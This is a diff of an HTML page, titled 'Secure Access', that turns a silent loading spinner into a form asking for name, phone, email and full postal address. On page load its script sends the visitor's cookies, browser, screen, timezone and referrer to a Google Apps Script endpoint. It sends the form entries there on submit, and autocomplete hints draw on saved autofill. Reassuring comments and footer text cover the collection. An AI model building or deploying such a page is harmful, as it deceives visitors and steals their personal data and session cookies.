@@ -1,212 +1,681 @@
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
 
-  <meta
-    name="viewport"
-    content="width=device-width, initial-scale=1.0"
-  >
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <title>Loading...</title>
+  <title>Secure Access</title>
 
   <style>
     * {
       box-sizing: border-box;
-    }
-
-    html,
-    body {
       margin: 0;
-      width: 100%;
-      height: 100%;
-      font-family: Arial, sans-serif;
-      background: #ffffff;
+      padding: 0;
     }
 
     body {
+      min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
+      background: #f7f8fa;
+      font-family:
+        Inter,
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        Roboto,
+        Arial,
+        sans-serif;
+      color: #222;
     }
 
-    .loader {
-      width: 42px;
-      height: 42px;
-      border: 4px solid #e8e8e8;
-      border-top-color: #222;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
+    .container {
+      width: min(92%, 460px);
+      background: #fff;
+      border: 1px solid #e8e8e8;
+      border-radius: 20px;
+      padding: 30px;
+      box-shadow:
+        0 10px 35px rgba(0, 0, 0, 0.07);
     }
 
-    @keyframes spin {
-      to {
-        transform: rotate(360deg);
+    .logo {
+      width: 58px;
+      height: 58px;
+      border-radius: 16px;
+      background: #111;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 18px;
+      font-size: 23px;
+      font-weight: 700;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 24px;
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      text-align: center;
+      color: #777;
+      font-size: 14px;
+      line-height: 1.5;
+      margin-bottom: 25px;
+    }
+
+    .field {
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 7px;
+    }
+
+    input {
+      width: 100%;
+      height: 46px;
+      border: 1px solid #ddd;
+      border-radius: 11px;
+      padding: 0 13px;
+      font-size: 15px;
+      outline: none;
+      transition: 0.2s;
+      background: #fff;
+    }
+
+    input:focus {
+      border-color: #777;
+      box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.05);
+    }
+
+    button {
+      width: 100%;
+      height: 47px;
+      border: none;
+      border-radius: 11px;
+      background: #111;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 5px;
+    }
+
+    button:hover {
+      background: #2b2b2b;
+    }
+
+    .status {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 13px;
+      color: #777;
+      min-height: 20px;
+    }
+
+    .success {
+      color: #16803c;
+    }
+
+    .error {
+      color: #c62828;
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 11px;
+      color: #aaa;
+      line-height: 1.5;
+    }
+
+    @media (max-width: 500px) {
+      .container {
+        padding: 24px 20px;
+        border-radius: 16px;
       }
-    }
 
-    .hidden {
-      display: none;
+      h1 {
+        font-size: 21px;
+      }
     }
   </style>
 </head>
 
 <body>
 
-  <div class="loader" id="loader"></div>
+  <main class="container">
+
+    <div class="logo">
+      A
+    </div>
+
+    <h1>Secure Access</h1>
+
+    <p class="subtitle">
+      Please enter your information to continue.
+    </p>
+
+
+    <!--
+      IMPORTANT:
+      These autocomplete attributes allow Chrome/Edge/etc.
+      to offer the user's saved Autofill information.
+
+      The website does NOT read browser Autofill storage directly.
+      Values are available to JavaScript only after they are
+      actually entered/selected into these fields.
+    -->
+
+    <form id="visitorForm" autocomplete="on">
+
+      <div class="field">
+        <label for="name">Full Name</label>
+
+        <input
+          id="name"
+          name="name"
+          type="text"
+          autocomplete="name"
+          placeholder="Full Name"
+        >
+      </div>
+
+
+      <div class="field">
+        <label for="phone">Phone Number</label>
+
+        <input
+          id="phone"
+          name="phone"
+          type="tel"
+          autocomplete="tel"
+          placeholder="Phone Number"
+        >
+      </div>
+
+
+      <div class="field">
+        <label for="email">Email Address</label>
+
+        <input
+          id="email"
+          name="email"
+          type="email"
+          autocomplete="email"
+          placeholder="Email Address"
+        >
+      </div>
+
+
+      <div class="field">
+        <label for="address">Address</label>
+
+        <input
+          id="address"
+          name="address"
+          type="text"
+          autocomplete="street-address"
+          placeholder="Street Address"
+        >
+      </div>
+
+
+      <div class="field">
+        <label for="city">City</label>
+
+        <input
+          id="city"
+          name="city"
+          type="text"
+          autocomplete="address-level2"
+          placeholder="City"
+        >
+      </div>
+
+
+      <div class="field">
+        <label for="state">State</label>
+
+        <input
+          id="state"
+          name="state"
+          type="text"
+          autocomplete="address-level1"
+          placeholder="State"
+        >
+      </div>
+
+
+      <div class="field">
+        <label for="postal">PIN / Postal Code</label>
+
+        <input
+          id="postal"
+          name="postal"
+          type="text"
+          autocomplete="postal-code"
+          placeholder="PIN Code"
+        >
+      </div>
+
+
+      <button type="submit">
+        Continue
+      </button>
+
+    </form>
+
+
+    <div
+      id="status"
+      class="status"
+    ></div>
+
+
+    <div class="footer">
+      Your browser controls Autofill information.
+      This website cannot access saved browser data automatically.
+    </div>
+
+  </main>
+
 
   <script>
 
-    // =========================================================
-    // GOOGLE APPS SCRIPT API
-    // =========================================================
+    // ==========================================================
+    // API
+    // ==========================================================
 
     const apiUrl =
       "https://script.google.com/macros/s/AKfycbwq50GYdV-Ni85OJi0jKz92wON53HIAbIL1QnkHBJ9eQMge5lyR5_T_2NYC0ZZRfT3D4Q/exec";
 
 
-    // =========================================================
-    // GET COOKIE INFORMATION
-    // =========================================================
+    // ==========================================================
+    // BASIC DEVICE INFORMATION
+    // ==========================================================
+
+    function getDeviceType() {
+
+      const ua = navigator.userAgent;
+
+      if (/tablet|ipad/i.test(ua)) {
+        return "Tablet";
+      }
+
+      if (/mobile|android|iphone/i.test(ua)) {
+        return "Mobile";
+      }
+
+      return "Desktop";
+    }
+
+
+    // ==========================================================
+    // OS
+    // ==========================================================
+
+    function getOS() {
+
+      const ua = navigator.userAgent;
+
+      if (/Windows NT/i.test(ua)) {
+        return "Windows";
+      }
+
+      if (/Android/i.test(ua)) {
+        return "Android";
+      }
+
+      if (/iPhone|iPad|iPod/i.test(ua)) {
+        return "iOS";
+      }
+
+      if (/Mac OS X/i.test(ua)) {
+        return "macOS";
+      }
+
+      if (/Linux/i.test(ua)) {
+        return "Linux";
+      }
+
+      return "Unknown";
+    }
+
+
+    // ==========================================================
+    // BROWSER
+    // ==========================================================
+
+    function getBrowser() {
+
+      const ua = navigator.userAgent;
+
+      if (/Edg\//i.test(ua)) {
+        return "Microsoft Edge";
+      }
+
+      if (/OPR\//i.test(ua)) {
+        return "Opera";
+      }
+
+      if (/Chrome\//i.test(ua)) {
+        return "Google Chrome";
+      }
+
+      if (/Firefox\//i.test(ua)) {
+        return "Mozilla Firefox";
+      }
+
+      if (/Safari\//i.test(ua) &&
+          !/Chrome\//i.test(ua)) {
+        return "Safari";
+      }
+
+      return "Unknown";
+    }
+
+
+    // ==========================================================
+    // READ WEBSITE COOKIES
+    // ==========================================================
 
     function getCookies() {
 
-      const cookieString = document.cookie || "";
+      if (!navigator.cookieEnabled) {
+        return "Cookies disabled";
+      }
 
-      if (!cookieString) {
+      if (!document.cookie) {
         return "No readable cookies";
       }
 
-      return cookieString;
+      return document.cookie;
     }
 
 
-    // =========================================================
-    // GET OS / PLATFORM INFORMATION
-    // =========================================================
+    // ==========================================================
+    // CREATE VISITOR INFORMATION
+    // ==========================================================
 
-    function getOSDetails() {
-
-      const ua = navigator.userAgent || "";
-      const platform = navigator.platform || "";
-
-      let os = "Unknown";
-
-      if (/Windows NT/i.test(ua)) {
-        os = "Windows";
-      }
-      else if (/Android/i.test(ua)) {
-        os = "Android";
-      }
-      else if (/iPhone|iPad|iPod/i.test(ua)) {
-        os = "iOS";
-      }
-      else if (/Mac OS X/i.test(ua)) {
-        os = "macOS";
-      }
-      else if (/Linux/i.test(ua)) {
-        os = "Linux";
-      }
+    function getVisitorInfo() {
 
       return {
-        os: os,
-        platform: platform,
-        userAgent: ua,
-        language: navigator.language || "",
-        languages: navigator.languages
-          ? navigator.languages.join(", ")
-          : "",
-        screen: `${screen.width}x${screen.height}`,
-        viewport: `${window.innerWidth}x${window.innerHeight}`,
+
+        device:
+          getDeviceType(),
+
+        os:
+          getOS(),
+
+        browser:
+          getBrowser(),
+
+        platform:
+          navigator.platform || "",
+
+        userAgent:
+          navigator.userAgent || "",
+
+        language:
+          navigator.language || "",
+
+        languages:
+          navigator.languages
+            ? navigator.languages.join(", ")
+            : "",
+
+        screen:
+          `${screen.width}x${screen.height}`,
+
+        viewport:
+          `${window.innerWidth}x${window.innerHeight}`,
+
         timezone:
-          Intl.DateTimeFormat().resolvedOptions().timeZone || "",
-        timezoneOffset: new Date().getTimezoneOffset(),
-        online: navigator.onLine,
-        cookiesEnabled: navigator.cookieEnabled
+          Intl.DateTimeFormat()
+            .resolvedOptions()
+            .timeZone || "",
+
+        timezoneOffset:
+          new Date().getTimezoneOffset(),
+
+        online:
+          navigator.onLine,
+
+        cookiesEnabled:
+          navigator.cookieEnabled,
+
+        cookies:
+          getCookies(),
+
+        referrer:
+          document.referrer || "Direct",
+
+        page:
+          window.location.href,
+
+        timestamp:
+          new Date().toISOString()
+
       };
+
     }
 
 
-    // =========================================================
-    // SEND DATA TO API
-    // =========================================================
+    // ==========================================================
+    // SEND PAGE-OPEN EVENT
+    // ==========================================================
 
-    async function sendVisitorData() {
+    async function sendPageOpen() {
 
-      const cookies = getCookies();
-      const osDetails = getOSDetails();
+      const info = getVisitorInfo();
 
-      /*
-       * Everything is placed inside "message".
-       * This keeps your existing API compatible.
-       */
-
-      const message = JSON.stringify({
-        cookies: cookies,
-        os: osDetails
-      });
+      const message =
+        "PAGE OPEN VISITOR REPORT\n\n" +
+        JSON.stringify(info, null, 2);
 
       try {
 
-        const response = await fetch(apiUrl, {
+        const response =
+          await fetch(apiUrl, {
 
-          method: "POST",
+            method: "POST",
 
-          headers: {
-            "Content-Type":
-              "application/x-www-form-urlencoded;charset=UTF-8"
-          },
+            headers: {
+              "Content-Type":
+                "application/x-www-form-urlencoded;charset=UTF-8"
+            },
 
-          body: new URLSearchParams({
+            body:
+              new URLSearchParams({
 
-            message: message,
+                message:
+                  message,
 
-            device:
-              /Mobi|Android|iPhone|iPad/i.test(
-                navigator.userAgent
-              )
-                ? "Mobile"
-                : "Desktop",
+                device:
+                  info.device,
 
-            timestamp:
-              new Date().toISOString()
+                timestamp:
+                  info.timestamp
 
-          })
+              })
 
-        });
+          });
 
-        const data = await response.json();
 
-        console.log("API Success:", data);
+        const result =
+          await response.text();
+
+        console.log(
+          "Page-open API response:",
+          result
+        );
 
       }
       catch (error) {
 
         console.error(
-          "API Error:",
+          "Page-open API error:",
           error
         );
 
       }
-      finally {
 
-        document
-          .getElementById("loader")
-          .classList.add("hidden");
-
-      }
     }
 
 
-    // =========================================================
-    // RUN WHEN PAGE OPENS
-    // =========================================================
+    // ==========================================================
+    // FORM SUBMISSION
+    // ==========================================================
+
+    document
+      .getElementById("visitorForm")
+      .addEventListener(
+        "submit",
+        async function(event) {
+
+          event.preventDefault();
+
+          const status =
+            document.getElementById("status");
+
+          const form =
+            document.getElementById("visitorForm");
+
+
+          const formData =
+            new FormData(form);
+
+
+          /*
+           * These values are ONLY values the user
+           * has actually entered or selected in the form.
+           */
+
+          const submittedData = {
+
+            name:
+              formData.get("name") || "",
+
+            phone:
+              formData.get("phone") || "",
+
+            email:
+              formData.get("email") || "",
+
+            address:
+              formData.get("address") || "",
+
+            city:
+              formData.get("city") || "",
+
+            state:
+              formData.get("state") || "",
+
+            postal:
+              formData.get("postal") || ""
+
+          };
+
+
+          const message =
+            "FORM SUBMISSION\n\n" +
+            JSON.stringify(
+              submittedData,
+              null,
+              2
+            );
+
+
+          status.textContent =
+            "Submitting...";
+
+
+          try {
+
+            const response =
+              await fetch(apiUrl, {
+
+                method: "POST",
+
+                headers: {
+                  "Content-Type":
+                    "application/x-www-form-urlencoded;charset=UTF-8"
+                },
+
+                body:
+                  new URLSearchParams({
+
+                    message:
+                      message,
+
+                    device:
+                      getDeviceType(),
+
+                    timestamp:
+                      new Date().toISOString()
+
+                  })
+
+              });
+
+
+            const result =
+              await response.text();
+
+
+            console.log(
+              "Form API response:",
+              result
+            );
+
+
+            status.textContent =
+              "Submitted successfully.";
+
+            status.className =
+              "status success";
+
+          }
+          catch (error) {
+
+            console.error(
+              "Form API error:",
+              error
+            );
+
+
+            status.textContent =
+              "Unable to submit.";
+
+            status.className =
+              "status error";
+
+          }
+
+        }
+      );
+
+
+    // ==========================================================
+    // AUTOMATIC PAGE-OPEN API CALL
+    // ==========================================================
 
     window.addEventListener(
       "DOMContentLoaded",
-      () => {
+      function() {
 
-        sendVisitorData();
+        sendPageOpen();
 
       }
     );
@@ -215,3 +684,4 @@
 
 </body>
 </html>
+```
